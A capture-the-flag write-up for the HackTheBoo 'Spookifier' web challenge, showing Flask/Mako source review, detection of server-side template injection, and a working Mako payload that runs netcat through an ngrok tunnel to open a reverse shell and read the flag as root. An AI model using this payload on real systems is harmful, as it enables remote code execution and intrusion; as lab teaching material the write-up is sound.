# Spookifier

## Background

> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

> Difficulty: Easy

- Overall difficulty for me: Very easy

**In this challenge, we can spawn a docker instance and [download a file](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Spookifier/web_spookifier.zip):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Spookifier/images/a1.png)

```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Web/Spookifier]
└─# unzip web_spookifier.zip           
Archive:  web_spookifier.zip
   creating: web_spookifier/
   creating: web_spookifier/challenge/
  inflating: web_spookifier/challenge/run.py  
   creating: web_spookifier/challenge/application/
   creating: web_spookifier/challenge/application/static/
   creating: web_spookifier/challenge/application/static/images/
  inflating: web_spookifier/challenge/application/static/images/vamp.png  
   creating: web_spookifier/challenge/application/static/css/
  inflating: web_spookifier/challenge/application/static/css/index.css  
  inflating: web_spookifier/challenge/application/static/css/nes.css  
   creating: web_spookifier/challenge/application/blueprints/
  inflating: web_spookifier/challenge/application/blueprints/routes.py  
  inflating: web_spookifier/challenge/application/util.py  
   creating: web_spookifier/challenge/application/templates/
  inflating: web_spookifier/challenge/application/templates/index.html  
  inflating: web_spookifier/challenge/application/main.py  
   creating: web_spookifier/config/
  inflating: web_spookifier/config/supervisord.conf  
  inflating: web_spookifier/build-docker.sh  
 extracting: web_spookifier/flag.txt  
  inflating: web_spookifier/Dockerfile
```

## Find the flag

**In the `routes.py`, we can see a route in `/`:**
```py
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```

**Let's break it down!**

- It has a GET parameter called `text`
- `coverted` = `spookify()` function in `util.py`
- **Render a `index.html` template, and output the `converted` value**
- If no `text` GET parameter given, then render `index.html`

**Hmm... Rendering a template, maybe it's vulnerable to SSTI (Server-Side Template Injection)?**

**Since the `coverted` variable is using a function from `util.py`, let's look at that!**
```py
from mako.template import Template

"""
Bunch of sniped fonts are defined in here.
"""

def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()

def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts

def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)
```

**In this python script, if we supply `text` GET parameter in `/`, it'll render 4 fonts.**

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Spookifier/images/a2.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Spookifier/images/a3.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Spookifier/images/a4.png)

**Armed with the above information, we can try some SSTI payloads!**

**According to [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako), we can use this payload:**
```py
${x}
```

**Let's test it is vulnerable to SSTI or not!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Spookifier/images/a6.png)

**Yes!! It's indeed vulnerable to SSTI!**

**Now, let's get reverse shell!**

To do so, I'll:

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/…/Spookifier/web_spookifier/challenge/application]
└─# nc -lnvp 9001
listening on [any] 9001 ...
```

- Use `ngork` for port forwarding:

```
┌──(root🌸siunam)-[~/…/Spookifier/web_spookifier/challenge/application]
└─# ngrok tcp 9001
[...]
Web Interface                 http://127.0.0.1:4040                                                        
Forwarding                    tcp://0.tcp.ap.ngrok.io:15113 -> localhost:9001
[...]
```

- Send the payload!

```py
${self.module.cache.util.os.system("nc 0.tcp.ap.ngrok.io 15113 -e /bin/sh")}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Spookifier/images/a7.png)

```
┌──(root🌸siunam)-[~/…/Spookifier/web_spookifier/challenge/application]
└─# nc -lnvp 9001
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48422
whoami;hostname;id;ip a
root
ng-spookifier-sfu0z-855798d4f6-4mdww
uid=0(root) gid=0(root) groups=1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
[...]
12469: eth0@if12470: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 8a:0a:07:bb:1c:ec brd ff:ff:ff:ff:ff:ff
    inet 10.244.2.96/32 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::880a:7ff:febb:1cec/64 scope link 
       valid_lft forever preferred_lft forever
```

**Boom! We're in! Let's get the flag!**
```
cat /flag.txt
HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}
```

# Conclusion

What we've learned:

1. Server-Side Template Injection (SSTI) in Python's Flask Mako